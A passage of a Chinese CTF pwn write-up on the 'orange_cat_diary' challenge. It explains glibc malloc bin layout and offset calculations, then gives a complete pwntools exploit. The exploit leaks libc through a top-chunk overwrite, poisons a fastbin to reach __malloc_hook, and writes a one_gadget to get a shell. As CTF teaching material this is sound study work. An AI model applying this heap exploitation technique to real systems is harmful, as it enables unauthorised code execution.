+<p>下面分别列出32位与64位该结构体的偏移</p>
+<table>
+<thead>
+<tr>
+<th>结构体成员</th>
+<th>i386</th>
+<th>amd64</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__libc_lock_define(, mutex);</td>
+<td>4B</td>
+<td>4B</td>
+</tr>
+<tr>
+<td>int flags;</td>
+<td>4B</td>
+<td>4B</td>
+</tr>
+<tr>
+<td>int have_fastchunks;</td>
+<td>4B</td>
+<td>4B</td>
+</tr>
+<tr>
+<td>mfastbinptr fastbinsY[NFASTBINS];</td>
+<td>40B&#x3D;4B*10</td>
+<td>80B&#x3D;8B*10</td>
+</tr>
+<tr>
+<td>mchunkptr top;</td>
+<td>4B</td>
+<td>8B</td>
+</tr>
+<tr>
+<td>mchunkptr last_remainder;</td>
+<td>4B</td>
+<td>8B</td>
+</tr>
+<tr>
+<td>mchunkptr bins[NBINS * 2 - 2];</td>
+<td>1016B&#x3D;4B*254</td>
+<td>2032B&#x3D;8B*254</td>
+</tr>
+<tr>
+<td>unsigned int binmap[BINMAPSIZE];</td>
+<td>16B&#x3D;4B*4</td>
+<td>16B&#x3D;4B*4</td>
+</tr>
+<tr>
+<td>struct malloc_state* next;</td>
+<td>4B</td>
+<td>8B</td>
+</tr>
+<tr>
+<td>struct malloc_state* next_free;</td>
+<td>4B</td>
+<td>8B</td>
+</tr>
+<tr>
+<td>INTERNAL_SIZE_T attached_threads;</td>
+<td>4B</td>
+<td>8B</td>
+</tr>
+<tr>
+<td>INTERNAL_SIZE_T system_mem;</td>
+<td>4B</td>
+<td>8B</td>
+</tr>
+<tr>
+<td>INTERNAL_SIZE_T max_system_mem;</td>
+<td>4B</td>
+<td>8B</td>
+</tr>
+</tbody></table>
+<p>bins数组每两位为一组，存放一个chunk的fd和bk<br><code>chunk=bin_at(1)</code>将<code>&amp;bins[(i-1)*2]-0x10</code>返回，之后调用<code>chunk-&gt;fd</code>即返回<code>bins[0]</code>的值，调用<code>chunk-&gt;bk</code>即返回<code>bins[1]</code>的值</p>
+<table>
+<thead>
+<tr>
+<th>所属bin类型</th>
+<th>bin_at下标</th>
+<th>bins下标</th>
+<th>数量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>unsorted bin</td>
+<td>1</td>
+<td>0~1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>small bin</td>
+<td>2~63</td>
+<td>2~124</td>
+<td>62</td>
+</tr>
+<tr>
+<td>large bin</td>
+<td>64~126</td>
+<td>125~253</td>
+<td>63</td>
+</tr>
+</tbody></table>
+<p>small bin 大小与下标</p>
+<table>
+<thead>
+<tr>
+<th>bin_at</th>
+<th>SIZE_SZ&#x3D;4(32 位)</th>
+<th>SIZE_SZ&#x3D;8(64 位)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>16B</td>
+<td>32B</td>
+</tr>
+<tr>
+<td>3</td>
+<td>24B</td>
+<td>48B</td>
+</tr>
+<tr>
+<td>4</td>
+<td>32B</td>
+<td>64B</td>
+</tr>
+<tr>
+<td>5</td>
+<td>40B</td>
+<td>80B</td>
+</tr>
+<tr>
+<td>x</td>
+<td><code>2*4*x</code>B</td>
+<td><code>2*8*x</code>B</td>
+</tr>
+<tr>
+<td>63</td>
+<td>504B</td>
+<td>1008B</td>
+</tr>
+</tbody></table>
+<p>large bin 大小与下标</p>
+<table>
+<thead>
+<tr>
+<th>bin_at</th>
+<th>组</th>
+<th>数量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>64~95</td>
+<td>1</td>
+<td>32</td>
+</tr>
+<tr>
+<td>96~111</td>
+<td>2</td>
+<td>16</td>
+</tr>
+<tr>
+<td>112~119</td>
+<td>3</td>
+<td>8</td>
+</tr>
+<tr>
+<td>120~123</td>
+<td>4</td>
+<td>4</td>
+</tr>
+<tr>
+<td>124~125</td>
+<td>5</td>
+<td>2</td>
+</tr>
+<tr>
+<td>126</td>
+<td>6</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32(sz)                                                  \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38)                                     \</span><br><span class="hljs-meta">         ? 56 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32_big(sz)                                              \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45)                                     \</span><br><span class="hljs-meta">         ? 49 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-comment">// XXX It remains to be seen whether it is good to keep the widths of</span><br><span class="hljs-comment">// XXX the buckets the same or whether it should be scaled by a factor</span><br><span class="hljs-comment">// XXX of two as well.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_64(sz)                                                  \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48)                                     \</span><br><span class="hljs-meta">         ? 48 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index(sz)                                                     \</span><br><span class="hljs-meta">    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \</span><br><span class="hljs-meta">                                                ? largebin_index_32_big(sz)    \</span><br><span class="hljs-meta">                                                : largebin_index_32(sz))</span><br></code></pre></td></tr></table></figure>
+
+<p>我们将top chunk的size修改为0xf90，利用申请大chunk将top chunk释放到unsorted bin，再申请一个0x10的chunk时<br>会先将unsorted bin中的chunk取出，放到相应的small bin或者large bin<br>本题会将unsorted bin中大小为0xf90的堆块放到large bin，利用largebin_index_64计算得出index为98<br>而bin_at为98的值对应的bins下标为 <code>(98-1)*2=194</code><br>所以计算出bk在main_arena的偏移为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">word_bytes = context.word_size // <span class="hljs-number">8</span> <span class="hljs-comment"># i386-&gt;word_size=32  amd64-&gt;word_size=64</span><br>bin_at = <span class="hljs-number">98</span><br>bins = (bin_at-<span class="hljs-number">1</span>)*<span class="hljs-number">2</span><br>offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br><span class="hljs-comment"># offset += 4  # have_fastchunks</span><br>offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># fastbinY</span><br>offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>offset += word_bytes * bins <span class="hljs-comment"># offset bins</span><br>offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br><span class="hljs-built_in">print</span>(offset) <span class="hljs-comment">#1640</span><br></code></pre></td></tr></table></figure>
+
+<p>最后减去<code>word_bytes * 2</code>是因为bins的bk指针指向的是<code>&amp;bins[(i-1)*2]-0x10</code>，所以要减去<code>word_bytes * 2</code>即0x10<br>最终计算结果与调试结果一致</p>
+<p>bk在main_arena的偏移为1640，main_arena在libc的偏移为0x3C4B20<br>所以最终偏移为<code>1640+0x3C4B20=0x3c5188</code></p>
+<h4 id="分配到malloc-hook"><a href="#分配到malloc-hook" class="headerlink" title="分配到malloc_hook"></a>分配到malloc_hook</h4><p>因为程序在free堆块之后没有清空，可以继续写值，那我们就可以修改这个堆块的fd指针指向一个addr<br>之后申请该大小的堆块之后，对应大小的fastbin指针就会指向fd指针，即addr<br>再次malloc申请内存时，由于对应的fastbin指针不为NULL，就会将addr作为堆块分配出来，即可实现任意地址写的操作</p>
+<p>不过fastbin在分配内存时，会检测指针指向的地方(将其作为malloc_chunk)的size是不是和对应的fastbin大小相等，不是则报错</p>
+<p>所以我们要找一个合适的addr，addr处为pre_size，这个可以为任意值，但addr+8必须为对应fastbin的size</p>
+<p>下面是源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">        ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span><br><span class="hljs-meta">  do							\</span><br><span class="hljs-meta">    &#123;							\</span><br><span class="hljs-meta">      victim = pp;					\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)				\</span><br><span class="hljs-meta">	break;						\</span><br><span class="hljs-meta">    &#125;							\</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">	 != victim);					\</span><br><span class="hljs-meta"></span><br>  <span class="hljs-comment">// 如果对齐之后的请求字节(nb)处于fastbin的范围中</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      <span class="hljs-comment">//fastbin下标</span><br>      idx = fastbin_index (nb);<br>      <span class="hljs-comment">//对应fastbin的头指针</span><br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br><br>      <span class="hljs-comment">//victim不为空，即对应的fastbin不为空</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>	    *fb = victim-&gt;fd;<br>	  <span class="hljs-keyword">else</span><br>	    REMOVE_FB (fb, pp, victim);<br>	  <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>	    &#123;<br>        <span class="hljs-comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span><br>        <span class="hljs-comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span><br>        <span class="hljs-comment">// 利用fastbin_index 计算 chunk 的索引</span><br>	    <span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize (victim)); <span class="hljs-comment">//这一句是检测的关键，我们要使计算后的victim_idx和idx相等</span><br><br>        <span class="hljs-comment">//检测</span><br>	      <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>		malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br><br>        <span class="hljs-comment">//更细致的检查，只在-DMALLOC_DEBUG时使用</span><br>	      check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>	      <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">		 stash them in the tcache.  */</span><br>	      <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>	      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>		&#123;<br>		  mchunkptr tc_victim;<br><br>		  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>		  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>			 &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>		    &#123;<br>		      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>			*fb = tc_victim-&gt;fd;<br>		      <span class="hljs-keyword">else</span><br>			&#123;<br>			  REMOVE_FB (fb, pp, tc_victim);<br>			  <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>			    <span class="hljs-keyword">break</span>;<br>			&#125;<br>		      tcache_put (tc_victim, tc_idx);<br>		    &#125;<br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>	      alloc_perturb (p, bytes);<br>	      <span class="hljs-keyword">return</span> p;<br>	    &#125;<br>	&#125;<br>  <span class="hljs-comment">// 对应的fastbin为空，检查smallbin</span><br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们调试一下看看__malloc_hook上方有没有满足要求的值 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx (uint64_t)&amp;__malloc_hook-<span class="hljs-number">0</span>x23<br><span class="hljs-attribute">0x7c63ee9ebaed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:   <span class="hljs-number">0</span>x63ee9ea260000000      <span class="hljs-number">0</span>x000000000000007c<br><span class="hljs-attribute">0x7c63ee9ebafd</span>: <span class="hljs-number">0</span>x63ee6acea0000000      <span class="hljs-number">0</span>x63ee6aca7000007c<br><span class="hljs-attribute">0x7c63ee9ebb0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:      <span class="hljs-number">0</span>x000000000000007c      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7c63ee9ebb1d</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7c63ee9ebb2d</span> &lt;main_arena+<span class="hljs-number">13</span>&gt;: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure>
+<p>我们看到，在__malloc__hook(地址为0x7c63ee9ebb10)的上方(__malloc__hook - 0x23 + 0x8)刚好有个0x7c(0b0111 1100)<br>我们计算一下 size_t victim_idx &#x3D; fastbin_index (chunksize (victim));</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">chunksize_nomask(p) -&gt; <span class="hljs-number">0x7c</span>(<span class="hljs-number">0b0111</span> <span class="hljs-number">1100</span>)<br>chunksize(p) -&gt; <span class="hljs-number">0x78</span>(<span class="hljs-number">0b0111</span> <span class="hljs-number">1000</span>)<br>fast_index(sz)  -&gt; ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - <span class="hljs-number">2</span>) <br>                -&gt; ((((unsigned int) (sz)) &gt;&gt; <span class="hljs-number">4</span>) - <span class="hljs-number">2</span>) <br>                -&gt; (<span class="hljs-number">0x7</span>)<span class="hljs-number">0b0111</span> - <span class="hljs-number">2</span><br>                -&gt; <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>fastbinY</th>
+<th>32位chunk_size</th>
+<th>64位chunk_size</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>fastbinY[0]</td>
+<td>0x18</td>
+<td>0x20</td>
+</tr>
+<tr>
+<td>fastbinY[1]</td>
+<td>0x20</td>
+<td>0x30</td>
+</tr>
+<tr>
+<td>fastbinY[2]</td>
+<td>0x28</td>
+<td>0x40</td>
+</tr>
+<tr>
+<td>fastbinY[3]</td>
+<td>0x30</td>
+<td>0x50</td>
+</tr>
+<tr>
+<td>fastbinY[4]</td>
+<td>0x38</td>
+<td>0x60</td>
+</tr>
+<tr>
+<td>fastbinY[5]</td>
+<td>0x40</td>
+<td>0x70</td>
+</tr>
+<tr>
+<td>fastbinY[6]</td>
+<td>0x48</td>
+<td>0x80</td>
+</tr>
+</tbody></table>
+<p>即fastbin的idx为5，对应chunk大小为0x70<br>当我们申请0x60到0x68字节大小的空间时，会先调用一个checked_request2size的宏转为0x70的chunk size<br>所以我们可以申请0x60~0x68的空间，即可绕过fastbin的检测</p>
+<p>申请到的内存会转换为用户内存(+0x10)，所以此时__malloc_hook的位置在申请到的指针的0x13字节之后</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./orange_cat_diary&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-comment"># gadget</span><br>one_gadget1 = <span class="hljs-number">0x4527a</span><br>one_gadget2 = <span class="hljs-number">0xf03a4</span><br>one_gadget3 = <span class="hljs-number">0xf1247</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;Hello, I&#x27;m delighted to meet you. Please tell me your name.&quot;</span>,<span class="hljs-string">b&#x27;zzkkk1h&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-comment"># 修改top chunk大小</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>edit(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0xf91</span>))<br><br><span class="hljs-comment"># 申请较大chunk使修改后的top chunk置入unsorted bin</span><br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-comment"># 从unsorted bin中申请内存，填上8字节数据，show泄露bk指针内容，调试获取bk指针指向位置在main_arena的偏移</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-(<span class="hljs-number">1640</span>+<span class="hljs-number">0x3C4B20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># 计算 malloc_hook 和 one_gadget 的地址</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>one_gadget = libc_base + one_gadget2<br><br><span class="hljs-comment"># 申请内存块</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><br><span class="hljs-comment"># 删除刚刚申请的堆块，放入fastbin中</span><br>delete()<br><br><span class="hljs-comment"># 在fd指针位置写上malloc_hook-0x23的值，这个地址+8后刚好为0x7c，可以申请0x68大小的空间</span><br>edit(<span class="hljs-number">0x68</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<br><br><span class="hljs-comment"># 0x13字节后即为__malloc_hook的位置，写上one_gadget</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget))<br><br><span class="hljs-comment"># 再次调用malloc就会执行__malloc_hook处的指令，即可获取shell</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x30</span>).encode())<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="ezbuf"><a href="#ezbuf" class="headerlink" title="ezbuf"></a>ezbuf</h2><h3 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://protobuf.dev/overview/">https://protobuf.dev/overview/</a><br>protobuf-c的官方文档：<a target="_blank" rel="noopener" href="https://protobuf-c.github.io/protobuf-c">https://protobuf-c.github.io/protobuf-c</a><br>protobuf-c的源码仓库：<a target="_blank" rel="noopener" href="https://github.com/protobuf-c/protobuf-c">https://github.com/protobuf-c/protobuf-c</a></p>
+</blockquote>
